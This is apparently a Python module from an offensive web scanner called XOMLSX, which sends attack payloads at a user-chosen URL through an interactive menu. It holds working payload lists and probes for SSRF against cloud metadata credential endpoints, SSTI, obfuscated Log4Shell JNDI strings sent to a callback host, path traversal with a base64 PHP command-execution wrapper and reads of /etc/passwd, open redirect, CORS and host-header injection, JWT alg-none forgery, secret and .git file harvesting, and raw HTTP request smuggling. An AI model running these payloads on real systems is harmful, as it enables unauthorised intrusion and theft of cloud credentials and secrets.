#!/usr/bin/env python3
"""
XOMLSX — Modern Attack / Vulnerability Probe Module
Strong, current-year probes: SSRF + cloud IMDS, SSTI, Log4Shell/JNDI,
path-traversal RCE wrappers, open redirect, CORS, Host-header, GraphQL,
JWT alg-none, Spring Actuator / env leaks, .env / secrets, Next.js style paths.
Production-oriented: bounded, fail-closed, evidence-driven.
"""

from __future__ import annotations

import json
import random
import re
import socket
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, quote, urlencode, urljoin, urlparse, urlunparse

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    requests = None


# ── colours (match scanner.py) ──────────────────────────────────────────────
class C:
    R = "\033[0m"
    B = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YEL = "\033[93m"
    CYN = "\033[96m"
    WHT = "\033[97m"
    GOLD = "\033[38;2;255;215;0m"
    NEON = "\033[38;2;0;255;213m"
    PURP = "\033[38;2;191;64;255m"
    GRAY = "\033[38;2;110;110;120m"
    AQUA = "\033[38;2;0;255;213m"
    CRIM = "\033[38;2;220;20;60m"


# ── helpers ──────────────────────────────────────────────────────────────────
def _session(proxies: Optional[dict] = None, timeout: float = 8.0) -> "requests.Session":
    s = requests.Session()
    s.verify = False
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
    })
    if proxies:
        s.proxies.update(proxies)
    s.timeout = timeout
    return s


def _get(s, url, **kw):
    try:
        return s.get(url, allow_redirects=False, timeout=kw.pop("timeout", 8), **kw)
    except Exception as e:
        return None


def _post(s, url, **kw):
    try:
        return s.post(url, allow_redirects=False, timeout=kw.pop("timeout", 8), **kw)
    except Exception:
        return None


def _marker(n: int = 8) -> str:
    return "xomlsx" + "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _params_from_url(url: str) -> List[str]:
    q = parse_qs(urlparse(url).query)
    return list(q.keys())


def _inject(url: str, param: str, value: str) -> str:
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [value]
    new_q = urlencode(qs, doseq=True)
    return urlunparse((p.scheme, p.netloc, p.path, p.params, new_q, p.fragment))


def _print_finding(kind: str, detail: str, evidence: str = ""):
    print(f"{C.RED}{C.B}[!] {kind}{C.R}")
    print(f"    {C.YEL}{detail}{C.R}")
    if evidence:
        ev = evidence[:180].replace("\n", " ")
        print(f"    {C.GRAY}Evidence: {ev}{C.R}")


# ══════════════════════════════════════════════════════════════════════════════
# 1. SSRF + Cloud Metadata
# ══════════════════════════════════════════════════════════════════════════════
SSRF_INTERNAL = [
    "http://127.0.0.1",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:9200",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    "http://2130706433",          # decimal 127.0.0.1
    "http://0x7f000001",
    "http://0177.0.0.1",
]

CLOUD_IMDS = [
    # AWS
    ("http://169.254.169.254/latest/meta-data/", "AWS IMDS"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds path"),
    ("http://169.254.169.254/latest/user-data", "AWS user-data"),
    ("http://169.254.169.254/latest/dynamic/instance-identity/document", "AWS instance identity"),
    # GCP
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", "GCP token"),
    # Azure
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"),
    # DigitalOcean / others
    ("http://169.254.169.254/metadata/v1/", "DO metadata"),
]

SSRF_SIGNATURES = [
    "ami-id", "instance-id", "local-ipv4", "security-credentials",
    "computeMetadata", "AccessKeyId", "SecretAccessKey", "Token",
    "project-id", "serviceAccounts", "azEnvironment", "subscriptionId",
    "root:x:", "SSH-", "mysql", "redis_version", "cluster_name",
]


def probe_ssrf(url: str, proxies=None, timeout=6.0, delay=0.15) -> List[dict]:
    """Inject SSRF payloads into every query param; also try common SSRF param names."""
    if not requests:
        print(f"{C.RED}[!] requests missing{C.R}")
        return []
    s = _session(proxies, timeout)
    findings = []
    params = _params_from_url(url)
    # also invent common SSRF param names if URL has none
    candidates = params or ["url", "uri", "path", "dest", "redirect", "next", "data",
                            "host", "site", "page", "u", "target", "fetch", "src", "file"]

    targets = SSRF_INTERNAL + [t[0] for t in CLOUD_IMDS]
    print(f"{C.GOLD}[*] SSRF probe — {len(candidates)} param(s), {len(targets)} destinations{C.R}")

    for param in candidates:
        for dest in targets:
            test_url = _inject(url, param, dest) if params else f"{url.rstrip('/')}?{param}={quote(dest, safe='')}"
            time.sleep(delay)
            r = _get(s, test_url, timeout=timeout)
            if not r:
                continue
            body = r.text or ""
            hit = any(sig.lower() in body.lower() for sig in SSRF_SIGNATURES)
            # cloud header tricks
            if "169.254.169.254" in dest or "metadata" in dest:
                # retry with required headers
                headers = {}
                if "google" in dest or "computeMetadata" in dest:
                    headers["Metadata-Flavor"] = "Google"
                if "api-version" in dest:
                    headers["Metadata"] = "true"
                r2 = _get(s, test_url, headers=headers, timeout=timeout)
                if r2 and any(sig.lower() in (r2.text or "").lower() for sig in SSRF_SIGNATURES):
                    hit = True
                    body = r2.text
            if hit or (r.status_code == 200 and len(body) > 20 and dest.startswith("http://127")):
                f = {"type": "SSRF", "param": param, "payload": dest, "url": test_url,
                     "status": r.status_code, "evidence": body[:300]}
                findings.append(f)
                _print_finding("SSRF", f"param={param} → {dest}", body[:120])
                break  # one hit per param enough
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# 2. SSTI (Jinja2 / Twig / Freemarker / Velocity / Pebble)
# ══════════════════════════════════════════════════════════════════════════════
SSTI_PROBES = [
    # math probes
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("${7*7}", "49", "Freemarker/JavaEL"),
    ("#{7*7}", "49", "Spring EL"),
    ("*{7*7}", "49", "Thymeleaf"),
    ("<%= 7*7 %>", "49", "ERB"),
    ("{{7*'7'}}", "7777777", "Jinja2"),
    ("${{7*7}}", "49", "Jinja2 nested"),
    ("{{config}}", "config", "Jinja2 config object"),
    ("{{self}}", "self", "Jinja2 self"),
    ("{{''.__class__}}", "__class__", "Jinja2 class"),
    ("{{request}}", "request", "Jinja2 request"),
    ("{{lipsum}}", "lipsum", "Jinja2 lipsum"),
]


def probe_ssti(url: str, proxies=None, timeout=6.0, delay=0.15) -> List[dict]:
    if not requests:
        return []
    s = _session(proxies, timeout)
    findings = []
    params = _params_from_url(url)
    if not params:
        print(f"{C.YEL}[!] No query params for SSTI — skipping{C.R}")
        return []
    print(f"{C.GOLD}[*] SSTI probe — {len(params)} param(s){C.R}")
    for param in params:
        baseline = _get(s, url, timeout=timeout)
        base_text = (baseline.text if baseline else "") or ""
        for payload, expect, engine in SSTI_PROBES:
            test_url = _inject(url, param, payload)
            time.sleep(delay)
            r = _get(s, test_url, timeout=timeout)
            if not r:
                continue
            body = r.text or ""
            if expect in body and expect not in base_text:
                f = {"type": "SSTI", "param": param, "payload": payload,
                     "engine": engine, "url": test_url, "evidence": body[:300]}
                findings.append(f)
                _print_finding(f"SSTI ({engine})", f"param={param} payload={payload}", body[:120])
                break
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# 3. Log4Shell / JNDI style probes (detection via DNS/callback placeholder)
# ══════════════════════════════════════════════════════════════════════════════
def probe_log4shell(url: str, callback_host: str = "oast.example", proxies=None,
                    timeout=5.0, delay=0.1) -> List[dict]:
    """
    Emit classic JNDI / Log4Shell payloads.
    Without a real OAST listener this is a fire-and-forget probe; results are
    reported as 'emitted' so the operator can correlate on their collaborator.
    """
    if not requests:
        return []
    s = _session(proxies, timeout)
    findings = []
    marker = _marker()
    jndi_payloads = [
        f"${{jndi:ldap://{marker}.{callback_host}/a}}",
        f"${{jndi:rmi://{marker}.{callback_host}/a}}",
        f"${{jndi:dns://{marker}.{callback_host}}}",
        f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{marker}.{callback_host}/a}}",
        f"${{jndi:${{lower:l}}${{lower:d}}${{lower:a}}${{lower:p}}://{marker}.{callback_host}/x}}",
        f"${{jndi:ldap://127.0.0.1#{marker}.{callback_host}/a}}",
    ]
    params = _params_from_url(url) or ["q", "search", "id", "name", "user"]
    headers_to_try = ["User-Agent", "X-Api-Version", "X-Forwarded-For", "Referer",
                      "X-Requested-With", "Authentication"]

    print(f"{C.GOLD}[*] Log4Shell / JNDI probe — marker={marker} callback={callback_host}{C.R}")
    print(f"{C.GRAY}    Correlate DNS/HTTP hits on your OAST for confirmation{C.R}")

    for param in params:
        for p in jndi_payloads[:3]:
            test_url = _inject(url, param, p) if _params_from_url(url) else f"{url}?{param}={quote(p)}"
            time.sleep(delay)
            _get(s, test_url, timeout=timeout)
            findings.append({"type": "Log4Shell-emit", "param": param, "payload": p,
                             "marker": marker, "url": test_url})

    # header injection
    for h in headers_to_try:
        for p in jndi_payloads[:2]:
            time.sleep(delay)
            try:
                s.get(url, headers={h: p}, timeout=timeout, verify=False)
            except Exception:
                pass
            findings.append({"type": "Log4Shell-emit-header", "header": h, "payload": p, "marker": marker})

    print(f"{C.NEON}[+] Emitted {len(findings)} JNDI payloads (marker={marker}){C.R}")
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# 4. Advanced Path Traversal + LFI wrappers / RCE indicators
# ══════════════════════════════════════════════════════════════════════════════
TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "....\\/....\\/....\\/....\\/etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "C:\\Windows\\win.ini",
    # wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
    "file:///etc/passwd",
]

TRAVERSAL_SIGS = [
    "root:x:", "daemon:", "[fonts]", "[extensions]", "<?php", "PD9waH",
    "uid=", "gid=", "Windows", "for 16-bit app support",
]


def probe_traversal(url: str, proxies=None, timeout=6.0, delay=0.12) -> List[dict]:
    if not requests:
        return []
    s = _session(proxies, timeout)
    findings = []
    params = _params_from_url(url) or ["file", "path", "page", "doc", "template", "include", "view", "src"]
    print(f"{C.GOLD}[*] Path traversal / LFI-wrapper probe{C.R}")
    for param in params:
        for payload in TRAVERSAL_PAYLOADS:
            test_url = _inject(url, param, payload) if _params_from_url(url) else f"{url}?{param}={quote(payload)}"
            time.sleep(delay)
            r = _get(s, test_url, timeout=timeout)
            if not r:
                continue
            body = r.text or ""
            if any(sig in body for sig in TRAVERSAL_SIGS):
                f = {"type": "PathTraversal/LFI", "param": param, "payload": payload,
                     "url": test_url, "evidence": body[:300]}
                findings.append(f)
                _print_finding("Path Traversal / LFI", f"param={param}", body[:120])
                break
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# 5. Open Redirect
# ══════════════════════════════════════════════════════════════════════════════
REDIRECT_PAYLOADS = [
    "https://evil.example",
    "//evil.example",
    "/\\evil.example",
    "https:evil.example",
    "////evil.example",
    "https://evil.example%00.good.com",
    "https://evil.example#.good.com",
    "https://evil.example?.good.com",
    "//evil.example/%2f..",
    "///evil.example",
]


def probe_open_redirect(url: str, proxies=None, timeout=6.0, delay=0.1) -> List[dict]:
    if not requests:
        return []
    s = _session(proxies, timeout)
    findings = []
    params = _params_from_url(url) or ["next", "url", "redirect", "return", "continue",
                                       "dest", "destination", "go", "target", "rurl", "redirect_uri"]
    print(f"{C.GOLD}[*] Open Redirect probe{C.R}")
    for param in params:
        for payload in REDIRECT_PAYLOADS:
            test_url = _inject(url, param, payload) if _params_from_url(url) else f"{url}?{param}={quote(payload)}"
            time.sleep(delay)
            r = _get(s, test_url, timeout=timeout)
            if not r:
                continue
            loc = r.headers.get("Location", "") or r.headers.get("location", "")
            if "evil.example" in loc.lower() or (r.status_code in (301, 302, 303, 307, 308) and "evil" in loc.lower()):
                f = {"type": "OpenRedirect", "param": param, "payload": payload,
                     "location": loc, "status": r.status_code, "url": test_url}
                findings.append(f)
                _print_finding("Open Redirect", f"param={param} → {loc}", loc)
                break
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# 6. CORS misconfiguration
# ══════════════════════════════════════════════════════════════════════════════
def probe_cors(url: str, proxies=None, timeout=6.0) -> List[dict]:
    if not requests:
        return []
    s = _session(proxies, timeout)
    findings = []
    origins = [
        "https://evil.example",
        "null",
        "https://attacker.com",
        urlparse(url).scheme + "://" + "evil." + urlparse(url).netloc,
    ]
    print(f"{C.GOLD}[*] CORS misconfiguration probe{C.R}")
    for origin in origins:
        try:
            r = s.get(url, headers={"Origin": origin}, timeout=timeout, verify=False)
        except Exception:
            continue
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        if acao == origin or acao == "*":
            if acao == "*" and acac.lower() == "true":
                sev = "HIGH — ACAO=* with credentials"
            elif acao == origin and acac.lower() == "true":
                sev = "HIGH — reflects Origin + credentials"
            else:
                sev = "MEDIUM — permissive ACAO"
            f = {"type": "CORS", "origin": origin, "ACAO": acao, "ACAC": acac, "severity": sev}
            findings.append(f)
            _print_finding("CORS", sev, f"Origin={origin} ACAO={acao} ACAC={acac}")
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# 7. Host Header Injection
# ══════════════════════════════════════════════════════════════════════════════
def probe_host_header(url: str, proxies=None, timeout=6.0) -> List[dict]:
    if not requests:
        return []
    s = _session(proxies, timeout)
    findings = []
    evil = "evil.example"
    print(f"{C.GOLD}[*] Host-header injection probe{C.R}")
    tests = [
        {"Host": evil},
        {"Host": urlparse(url).netloc, "X-Forwarded-Host": evil},
        {"Host": urlparse(url).netloc, "X-Host": evil},
        {"Host": urlparse(url).netloc, "X-Forwarded-Server": evil},
        {"Host": urlparse(url).netloc + "\r\nX-Injected: true"},
    ]
    for headers in tests:
        try:
            r = s.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=False)
        except Exception:
            continue
        body = r.text or ""
        loc = r.headers.get("Location", "")
        if evil in body or evil in loc:
            f = {"type": "HostHeader", "headers": headers, "status": r.status_code,
                 "evidence": (body[:200] if evil in body else loc)}
            findings.append(f)
            _print_finding("Host Header Injection", str(headers), f.get("evidence", "")[:120])
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# 8. GraphQL introspection
# ══════════════════════════════════════════════════════════════════════════════
GQL_INTROSPECTION = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types { name kind }
  }
}
"""


def probe_graphql(base_url: str, proxies=None, timeout=6.0) -> List[dict]:
    if not requests:
        return []
    s = _session(proxies, timeout)
    findings = []
    candidates = [
        "/graphql", "/graphiql", "/v1/graphql", "/api/graphql", "/gql",
        "/graphql/console", "/playground", "/altair",
    ]
    print(f"{C.GOLD}[*] GraphQL introspection probe{C.R}")
    parsed = urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    for path in candidates:
        u = root + path
        # GET
        r = _get(s, u + "?query=" + quote(GQL_INTROSPECTION), timeout=timeout)
        if r and r.status_code == 200 and ("__schema" in (r.text or "") or "queryType" in (r.text or "")):
            findings.append({"type": "GraphQL-Introspection", "url": u, "method": "GET",
                             "evidence": r.text[:300]})
            _print_finding("GraphQL Introspection", u, r.text[:100])
            continue
        # POST
        r = _post(s, u, json={"query": GQL_INTROSPECTION}, timeout=timeout)
        if r and r.status_code == 200 and ("__schema" in (r.text or "") or "queryType" in (r.text or "")):
            findings.append({"type": "GraphQL-Introspection", "url": u, "method": "POST",
                             "evidence": r.text[:300]})
            _print_finding("GraphQL Introspection", u, r.text[:100])
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# 9. JWT none / alg confusion (passive header check + none alg probe)
# ══════════════════════════════════════════════════════════════════════════════
def probe_jwt(url: str, proxies=None, timeout=6.0) -> List[dict]:
    if not requests:
        return []
    s = _session(proxies, timeout)
    findings = []
    print(f"{C.GOLD}[*] JWT surface probe{C.R}")
    r = _get(s, url, timeout=timeout)
    if not r:
        return []
    # look for JWT in Set-Cookie or body
    cookies = r.headers.get("Set-Cookie", "")
    body = r.text or ""
    jwt_re = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
    tokens = jwt_re.findall(cookies) + jwt_re.findall(body)
    for tok in tokens[:5]:
        parts = tok.split(".")
        if len(parts) < 2:
            continue
        try:
            import base64
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            alg = header.get("alg", "")
            if alg.lower() == "none":
                findings.append({"type": "JWT-none", "token": tok[:40] + "...", "header": header})
                _print_finding("JWT alg=none", str(header))
            else:
                # craft none version (detection only — do not send unless operator confirms)
                none_header = base64.urlsafe_b64encode(
                    json.dumps({"alg": "none", "typ": "JWT"}).encode()
                ).decode().rstrip("=")
                none_tok = none_header + "." + parts[1] + "."
                findings.append({"type": "JWT-found", "alg": alg, "none_candidate": none_tok[:60] + "...",
                                 "note": "none-alg candidate crafted; test manually on auth endpoints"})
                print(f"{C.YEL}[+] JWT found alg={alg} — none-candidate prepared{C.R}")
        except Exception:
            continue
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# 10. Spring Actuator / env / secrets exposure
# ══════════════════════════════════════════════════════════════════════════════
ACTUATOR_PATHS = [
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/info",
    "/actuator/beans", "/actuator/mappings", "/actuator/configprops",
    "/actuator/heapdump", "/actuator/threaddump", "/actuator/loggers",
    "/env", "/health", "/info", "/metrics", "/trace",
    "/.env", "/.env.local", "/.env.production", "/config.json",
    "/application.properties", "/application.yml", "/web.config",
    "/server-status", "/phpinfo.php", "/debug", "/console",
    "/_profiler", "/_wdt", "/api/v1/config", "/api/config",
    "/.git/HEAD", "/.git/config", "/.svn/entries",
    "/wp-config.php.bak", "/backup.sql", "/dump.sql",
    "/next.config.js", "/.next/server/app-paths-manifest.json",
    "/__nextjs_original-stack-frame", "/api/auth/session",
]


def probe_secrets_and_actuators(base_url: str, proxies=None, timeout=5.0,
                                threads: int = 12) -> List[dict]:
    if not requests:
        return []
    s = _session(proxies, timeout)
    findings = []
    parsed = urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    print(f"{C.GOLD}[*] Actuator / secrets / debug path probe ({len(ACTUATOR_PATHS)} paths){C.R}")

    def check(path):
        u = root + path
        r = _get(s, u, timeout=timeout)
        if not r:
            return None
        body = r.text or ""
        interesting = False
        reason = ""
        if r.status_code == 200 and len(body) > 10:
            if any(x in body.lower() for x in [
                "spring", "application.properties", "aws_access", "secret", "password",
                "api_key", "apikey", "private_key", "db_password", "jdbc:",
                "phpinfo", "document.root", "ref: refs/", "[core]", "heapdump",
            ]):
                interesting = True
                reason = "sensitive keyword"
            elif path.endswith(".env") and "=" in body and not body.strip().startswith("<"):
                interesting = True
                reason = ".env style content"
            elif path.startswith("/actuator") and ("status" in body or "beans" in body or "propertySources" in body):
                interesting = True
                reason = "actuator data"
            elif path == "/.git/HEAD" and "ref:" in body:
                interesting = True
                reason = "exposed .git"
        if interesting:
            return {"type": "ExposedPath", "path": path, "url": u, "status": r.status_code,
                    "reason": reason, "evidence": body[:250]}
        return None

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(check, p): p for p in ACTUATOR_PATHS}
        for fut in as_completed(futs):
            res = fut.result()
            if res:
                findings.append(res)
                _print_finding("Exposed Path", f"{res['path']} ({res['reason']})", res["evidence"][:100])
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# 11. HTTP Request Smuggling (light detection — CL.TE / TE.CL desync probe)
# ══════════════════════════════════════════════════════════════════════════════
def probe_smuggling(url: str, proxies=None, timeout=8.0) -> List[dict]:
    """
    Lightweight desync probe. Sends malformed CL/TE combinations and looks for
    anomalous timing or status. Full confirmation needs a proper desync lab;
    this flags interesting responses for manual follow-up.
    """
    findings = []
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    if not host:
        return []
    print(f"{C.GOLD}[*] HTTP request-smuggling light probe (CL.TE / TE.CL){C.R}")

    def raw_send(payload: bytes) -> Optional[str]:
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if parsed.scheme == "https":
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.sendall(payload)
            sock.settimeout(timeout)
            data = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 16384:
                        break
            except socket.timeout:
                pass
            sock.close()
            return data.decode("latin-1", errors="replace")
        except Exception:
            return None

    path = parsed.path or "/"
    # CL.TE
    clte = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n\r\n"
        f"G"
    ).encode()
    # TE.CL
    tecl = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"12\r\n"
        f"A"*18 + "\r\n"
        f"0\r\n\r\n"
    ).encode()

    for name, payload in (("CL.TE", clte), ("TE.CL", tecl)):
        resp = raw_send(payload)
        if resp is None:
            continue
        # anomalous: timeout already handled; look for 400/500 or dual responses
        if "HTTP/1.1 400" in resp or "HTTP/1.1 500" in resp or resp.count("HTTP/1.") > 1:
            findings.append({"type": "Smuggling-signal", "variant": name,
                             "evidence": resp[:250]})
            _print_finding(f"Smuggling signal ({name})", "anomalous response — verify manually",
                           resp[:120])
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# Orchestrator — Full modern web scan
# ══════════════════════════════════════════════════════════════════════════════
def run_modern_scan(url: str, proxies=None, timeout=6.0, delay=0.12,
                    oast: str = "oast.example") -> Dict[str, List[dict]]:
    print()
    print(f"{C.NEON}{C.B}{'=' * 62}{C.R}")
    print(f"{C.NEON}{C.B}  MODERN ATTACK SURFACE SCAN{C.R}")
    print(f"{C.NEON}{C.B}{'=' * 62}{C.R}")
    print(f"{C.GRAY}Target: {url}{C.R}")
    print()

    results: Dict[str, List[dict]] = {}
    results["ssrf"] = probe_ssrf(url, proxies, timeout, delay)
    results["ssti"] = probe_ssti(url, proxies, timeout, delay)
    results["log4shell"] = probe_log4shell(url, oast, proxies, timeout, delay)
    results["traversal"] = probe_traversal(url, proxies, timeout, delay)
    results["redirect"] = probe_open_redirect(url, proxies, timeout, delay)
    results["cors"] = probe_cors(url, proxies, timeout)
    results["host"] = probe_host_header(url, proxies, timeout)
    results["graphql"] = probe_graphql(url, proxies, timeout)
    results["jwt"] = probe_jwt(url, proxies, timeout)
    results["secrets"] = probe_secrets_and_actuators(url, proxies, timeout)
    results["smuggling"] = probe_smuggling(url, proxies, timeout)

    total = sum(len(v) for v in results.values())
    print()
    print(f"{C.NEON}{'=' * 62}{C.R}")
    print(f"{C.B}  SCAN COMPLETE — {total} finding(s){C.R}")
    print(f"{C.NEON}{'=' * 62}{C.R}")
    for k, v in results.items():
        color = C.RED if v else C.GREEN
        print(f"  {color}{k:12} {len(v):3}{C.R}")
    return results


def save_report(results: Dict[str, List[dict]], url: str, path: Optional[str] = None) -> str:
    path = path or f"modern_scan_{int(time.time())}.txt"
    with open(path, "w", encoding="utf-8") as f:
        f.write("=" * 60 + "\n  MODERN ATTACK SURFACE — RESULTS\n" + "=" * 60 + "\n\n")
        f.write(f"Target: {url}\n\n")
        for k, items in results.items():
            f.write(f"\n[{k.upper()}] — {len(items)} finding(s)\n" + "-" * 40 + "\n")
            for it in items:
                for key, val in it.items():
                    f.write(f"  {key}: {val}\n")
                f.write("\n")
    return path


# ── interactive runners (match scanner.py style) ─────────────────────────────
def _ask_url() -> str:
    url = input(f"{C.AQUA}[?] Target URL (with params if any): {C.R}").strip()
    if not url.startswith("http"):
        url = "http://" + url
    return url


def run_ssrf_scanner():
    print(f"\n{C.PURP}{C.B}  SSRF + Cloud Metadata Scanner{C.R}\n")
    url = _ask_url()
    findings = probe_ssrf(url)
    if not findings:
        print(f"{C.GREEN}[+] No SSRF indicators{C.R}")
    input(f"\n{C.GRAY}[Press Enter]{C.R}")


def run_ssti_scanner():
    print(f"\n{C.PURP}{C.B}  SSTI Scanner{C.R}\n")
    url = _ask_url()
    findings = probe_ssti(url)
    if not findings:
        print(f"{C.GREEN}[+] No SSTI indicators{C.R}")
    input(f"\n{C.GRAY}[Press Enter]{C.R}")


def run_log4shell_scanner():
    print(f"\n{C.PURP}{C.B}  Log4Shell / JNDI Emitter{C.R}\n")
    url = _ask_url()
    oast = input(f"{C.AQUA}[?] OAST / collaborator host (default oast.example): {C.R}").strip() or "oast.example"
    probe_log4shell(url, oast)
    input(f"\n{C.GRAY}[Press Enter]{C.R}")


def run_traversal_scanner():
    print(f"\n{C.PURP}{C.B}  Advanced Traversal / LFI-Wrapper{C.R}\n")
    url = _ask_url()
    findings = probe_traversal(url)
    if not findings:
        print(f"{C.GREEN}[+] No traversal indicators{C.R}")
    input(f"\n{C.GRAY}[Press Enter]{C.R}")


def run_full_modern_scan():
    print(f"\n{C.PURP}{C.B}  FULL MODERN WEB ATTACK SURFACE{C.R}\n")
    url = _ask_url()
    oast = input(f"{C.AQUA}[?] OAST host for Log4Shell (default oast.example): {C.R}").strip() or "oast.example"
    results = run_modern_scan(url, oast=oast)
    save = input(f"\n{C.AQUA}[?] Save report? [y/n]: {C.R}").strip().lower()
    if save == "y":
        path = save_report(results, url)
        print(f"{C.GREEN}[+] Saved: {path}{C.R}")
    input(f"\n{C.GRAY}[Press Enter]{C.R}")


def show_modern_menu():
    while True:
        print()
        print(f"{C.NEON}{'=' * 54}{C.R}")
        print(f"{C.B}  MODERN ATTACK MODULES{C.R}")
        print(f"{C.NEON}{'=' * 54}{C.R}")
        print(f"  {C.GREEN}1){C.R} SSRF + Cloud IMDS")
        print(f"  {C.GREEN}2){C.R} SSTI (Jinja/Twig/Freemarker/EL)")
        print(f"  {C.GREEN}3){C.R} Log4Shell / JNDI emitter")
        print(f"  {C.GREEN}4){C.R} Advanced Path Traversal / LFI wrappers")
        print(f"  {C.GREEN}5){C.R} Open Redirect")
        print(f"  {C.GREEN}6){C.R} CORS misconfiguration")
        print(f"  {C.GREEN}7){C.R} Host Header Injection")
        print(f"  {C.GREEN}8){C.R} GraphQL Introspection")
        print(f"  {C.GREEN}9){C.R} JWT surface / none-alg")
        print(f"  {C.GREEN}10){C.R} Actuator / .env / secrets / .git")
        print(f"  {C.GREEN}11){C.R} HTTP Request Smuggling (light)")
        print(f"  {C.GREEN}12){C.R} FULL modern surface scan")
        print(f"  {C.CYN}0){C.R} Back")
        print()
        ch = input(f"{C.AQUA}[?] Choose: {C.R}").strip()
        if ch == "1":
            run_ssrf_scanner()
        elif ch == "2":
            run_ssti_scanner()
        elif ch == "3":
            run_log4shell_scanner()
        elif ch == "4":
            run_traversal_scanner()
        elif ch == "5":
            url = _ask_url()
            probe_open_redirect(url)
            input(f"\n{C.GRAY}[Press Enter]{C.R}")
        elif ch == "6":
            url = _ask_url()
            probe_cors(url)
            input(f"\n{C.GRAY}[Press Enter]{C.R}")
        elif ch == "7":
            url = _ask_url()
            probe_host_header(url)
            input(f"\n{C.GRAY}[Press Enter]{C.R}")
        elif ch == "8":
            url = _ask_url()
            probe_graphql(url)
            input(f"\n{C.GRAY}[Press Enter]{C.R}")
        elif ch == "9":
            url = _ask_url()
            probe_jwt(url)
            input(f"\n{C.GRAY}[Press Enter]{C.R}")
        elif ch == "10":
            url = _ask_url()
            probe_secrets_and_actuators(url)
            input(f"\n{C.GRAY}[Press Enter]{C.R}")
        elif ch == "11":
            url = _ask_url()
            probe_smuggling(url)
            input(f"\n{C.GRAY}[Press Enter]{C.R}")
        elif ch == "12":
            run_full_modern_scan()
        elif ch in ("0", "b", "q"):
            return
        else:
            print(f"{C.RED}[!] Invalid{C.R}")


if __name__ == "__main__":
    show_modern_menu()
